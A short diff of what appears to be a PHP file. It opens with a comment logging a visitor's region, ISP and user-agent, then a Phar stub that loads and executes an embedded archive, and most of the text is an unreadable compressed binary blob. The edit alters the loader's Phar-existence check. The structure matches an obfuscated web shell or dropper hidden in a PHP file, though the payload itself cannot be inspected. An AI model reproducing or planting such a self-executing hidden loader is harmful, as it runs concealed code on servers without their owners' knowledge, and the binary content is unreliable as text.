@@ -8,7 +8,7 @@ Region		:	Riau
 Organization		:	Telekomunikasi Indonesia (PT)
 User-Agent		:	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
 ***/
-if(!class_exists('Phar')){exit('please install php-phar');}Phar::mapPhar();require_once'phar://'.__FILE__.'/';__HALT_COMPILER(); ?>
+if(!class_exists('')){exit('');}Phar::mapPhar();require_once'phar://'.__FILE__.'/';__HALT_COMPILER(); ?> 
 T             ¨­€ÿ¿.phar       WEJXqtQrKiwsK6ooKyzL0itVqgIAãx  ˆæraÖp  Ž*<$¤      Åýcx¥ËÖ0ŒÆvÒq:¶mtl;3¶í¤ctlÛN:¶mwlÛNçdíÕkïïÁû÷Ï¹ÎLîkV
 Õ`ª?óæá·3³ƒ¡§¢¢‚Öw2††æ‚fb`b¤ed eb"u07Òw'`bæbbçbe„‘°Ó72r0vtü‹Ž‘ƒŽ‰…ñóa¢cd‡2wrÿ,ol©oc ïà#dëlãäð/ „0Œ¢±©¹­Í_Es}g9S}s}§?@ec+cK[kgsK}Gs	#[cGs}
 yeJGcÚo¦Æ6NÑÊØz˜[YéÓ³Ò1P¨™’º:È*°Ñ1r|ÎÙX¸	ÜØX(	¾ÙÙY«H™;Ñ³2³Ó1³PH‰+ËHÓX™[ˆZÚR™9ØZÓs2Ó1Ð±°²³Óq0(é›è;˜ÿá‚ùô=Œ¹	¡‹±ƒã§Æº†¶ÖvúÆòâòºª"ŠJr²4ä¬tlä4ä|¼ä””ÆnæNÆ.úVD 76V #3€‘•ásl`ùübb¸±2Ñ‰™þš3 XØ?§tÿš222üAë~ÎÙ ŒŸ˜˜>f€ç'\î“†í“Íø_¢>%2²1ý½#Àõsü™ÃçóIÂÎü/¦ÿ,ø9ecý×zllŸ_ŸÊýµ¼Ã¿4ù[QÎÏç/˜ÙL V¶­ÆÎLDIÉMR~÷6úkŒ—èm
